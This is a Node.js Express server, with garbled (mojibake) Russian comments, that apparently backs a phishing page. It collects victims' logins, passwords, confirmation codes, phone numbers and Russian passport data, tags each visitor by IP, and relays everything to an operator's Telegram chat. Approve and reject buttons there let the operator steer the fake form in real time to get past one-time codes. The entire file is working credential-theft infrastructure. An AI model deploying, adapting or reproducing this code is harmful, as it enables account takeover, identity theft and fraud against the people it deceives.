require('dotenv').config();

// Add unhandled promise rejection handler at the very beginning
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
  // Optional: process.exit(1); // Exit with failure code if necessary
});

const express = require("express");
const fetch = require("node-fetch");
const bodyParser = require("body-parser");
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3001;

// === –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ===
if (!process.env.TELEGRAM_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
  console.error('–û—à–∏–±–∫–∞: –û—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è!');
  process.exit(1);
}

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(__dirname));

// –ü—Ä–æ—Å—Ç–æ–π –∫—ç—à –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–æ—Å–ª–µ–¥–Ω–∏—Ö IP-–∞–¥—Ä–µ—Å–æ–≤
const ipCache = new Map();
const CACHE_TIMEOUT = 24 * 60 * 60 * 1000; // 24 —á–∞—Å–∞

// –û—á–∏—Å—Ç–∫–∞ —Å—Ç–∞—Ä—ã—Ö –∑–∞–ø–∏—Å–µ–π –∏–∑ –∫—ç—à–∞
setInterval(() => {
  const now = Date.now();
  for (const [ip, data] of ipCache.entries()) {
    if (now - data.timestamp > CACHE_TIMEOUT) {
      ipCache.delete(ip);
    }
  }
}, 60 * 60 * 1000); // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–∞–∂–¥—ã–π —á–∞—Å

// –ö—ç—à –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Å—Ç–∞—Ç—É—Å–æ–≤
const statusCache = new Map();
const STATUS_TIMEOUT = 24 * 60 * 60 * 1000; // 24 —á–∞—Å–∞

// –û—á–∏—Å—Ç–∫–∞ —Å—Ç–∞—Ä—ã—Ö —Å—Ç–∞—Ç—É—Å–æ–≤
setInterval(() => {
  const now = Date.now();
  for (const [key, data] of statusCache.entries()) {
    if (now - data.timestamp > STATUS_TIMEOUT) {
      statusCache.delete(key);
    }
  }
}, 60 * 60 * 1000); // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–∞–∂–¥—ã–π —á–∞—Å

function getUserId(ip) {
  const cached = ipCache.get(ip);
  if (cached) {
    cached.timestamp = Date.now();
    return cached.userId;
  }
  
  const userId = (ipCache.size + 1).toString();
  ipCache.set(ip, { userId, timestamp: Date.now() });
  return userId;
}

async function sendToTelegram(message, replyMarkup = null) {
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: "HTML"
  };
  
  if (replyMarkup) {
    payload.reply_markup = JSON.stringify(replyMarkup);
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      console.error(`–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram: ${response.status}`);
      return false;
    }

    const data = await response.json();
    return data.ok;
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ Telegram:', error.message);
    return false;
  }
}

// === –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò –ó–ê–ü–†–û–°–û–í ===
app.post("/step", async (req, res) => {
  const { step, value, origin, userId } = req.body;
  if (!userId) return res.status(400).json({ error: 'No userId' });

  // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å—Ç–∞—Ç—É—Å –≤ –∫—ç—à
  const statusKey = `${userId}:${step}`;
  statusCache.set(statusKey, { status: "waiting", timestamp: Date.now() });

  const ip = formatIP(req.ip);
  let msg = `üìç –ò—Å—Ç–æ—á–Ω–∏–∫: ${origin || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\nüë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å #${userId}\nÔøΩÔøΩ IP: ${ip}\n`;
  
  const readable = {
    login: "–õ–æ–≥–∏–Ω",
    password: "–ü–∞—Ä–æ–ª—å",
    code: "–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è",
    code1: "–ö–æ–¥ 1",
    code2: "–ö–æ–¥ 2",
    code3: "–ö–æ–¥ 3",
    phone: "–¢–µ–ª–µ—Ñ–æ–Ω",
    document: "–î–æ–∫—É–º–µ–Ω—Ç",
    passport: "–ü–∞—Å–ø–æ—Ä—Ç –†–§",
    finalCode: "–§–∏–Ω–∞–ª—å–Ω—ã–π –∫–æ–¥",
    login_password: "–õ–æ–≥–∏–Ω/–ü–∞—Ä–æ–ª—å",
    document_type: "–¢–∏–ø –¥–æ–∫—É–º–µ–Ω—Ç–∞"
  };

  if (step === 'resend_code_click') {
    msg = `üîÑ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å #${userId} –Ω–∞–∂–∞–ª ¬´–û—Ç–ø—Ä–∞–≤–∏—Ç—å –ø–æ–≤—Ç–æ—Ä–Ω–æ¬ª\n${msg}`;
    await sendToTelegram(msg);
    return res.json({ ok: true });
  }

  msg += step === 'login_password' ? `üìÑ ${value}` : `üìÑ ${readable[step] || step}: ${value}`;

  const withApproval = ["login", "password", "login_password", "code", "code1", "code2", "code3", "document", "finalCode", "passport"];
  
  if (withApproval.includes(step)) {
    const reply_markup = {
      inline_keyboard: [[
        { text: "‚úÖ –í–µ—Ä–Ω–æ", callback_data: `${userId}:${step}:ok` },
        { text: "‚ùå –ù–µ–≤–µ—Ä–Ω–æ", callback_data: `${userId}:${step}:fail` }
      ]]
    };
    await sendToTelegram(msg, reply_markup);
  } else {
    await sendToTelegram(msg);
  }

  res.json({ ok: true });
});

app.post('/auth-visit', (req, res) => {
  const ip = formatIP(req.ip);
  const userId = getUserId(ip);
  const msg = `üÜï –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å #${userId} (IP: ${ip}) –∑–∞—à—ë–ª –Ω–∞ —Ñ–æ—Ä–º—É –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏\n–í—Ä–µ–º—è: ${getMoscowTime()}`;
  sendToTelegram(msg);
  res.json({ userId });
});

// –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ —Å—Ç–∞—Ç—É—Å–∞
app.get("/status", (req, res) => {
  const { step, userId } = req.query;
  if (!userId) return res.json({ status: "none" });
  
  const statusKey = `${userId}:${step}`;
  const cachedStatus = statusCache.get(statusKey);
  const status = cachedStatus ? cachedStatus.status : "none";
  
  res.json({ status });
});

// –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
function formatIP(ip) {
  return ip.replace('::ffff:', '');
}

function getMoscowTime() {
  return new Date().toLocaleString('ru-RU', {
    timeZone: 'Europe/Moscow',
    year: 'numeric',
    month: 'numeric',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
}

// === TELEGRAM POLLING ===
let pollingInterval = null;
let isPolling = false;
let lastUpdate = 0;

async function pollTelegram() {
  if (isPolling) return;
  
  isPolling = true;
  
  pollingInterval = setInterval(async () => {
    try {
      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdate + 1}&timeout=1`);
      if (!res.ok) return;
      
      const data = await res.json();
      if (!data.ok || !data.result?.length) return;
      
      for (const update of data.result) {
        lastUpdate = update.update_id;
        if (update.callback_query) {
          const [userId, step, action] = (update.callback_query.data || '').split(':');
          if (userId && step && action) {
            const statusKey = `${userId}:${step}`;
            statusCache.set(statusKey, { 
              status: action === 'ok' ? 'ok' : 'fail',
              timestamp: Date.now()
            });
            console.log(`–û–±–Ω–æ–≤–ª–µ–Ω —Å—Ç–∞—Ç—É—Å –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è ${userId}, —à–∞–≥ ${step}: ${action}`);
          }
        }
      }
    } catch (error) {
      console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–ø—Ä–æ—Å–µ Telegram:', error.message);
    }
  }, 500);
}

// –ó–∞–ø—É—Å–∫ –æ–ø—Ä–æ—Å–∞ Telegram
pollTelegram().catch(console.error);

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Ä–∞–±–æ—Ç—ã
process.on('SIGTERM', () => {
  if (pollingInterval) clearInterval(pollingInterval);
  process.exit(0);
});

process.on('SIGINT', () => {
  if (pollingInterval) clearInterval(pollingInterval);
  process.exit(0);
});

// –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –Ω–µ–æ–±—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã—Ö –∏—Å–∫–ª—é—á–µ–Ω–∏–π
process.on('uncaughtException', async (error) => {
  console.error('Uncaught Exception:', error);
  if (pollingInterval) clearInterval(pollingInterval);
  process.exit(1);
});

app.listen(PORT, () => {
  console.log(`–°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É ${PORT}`);
});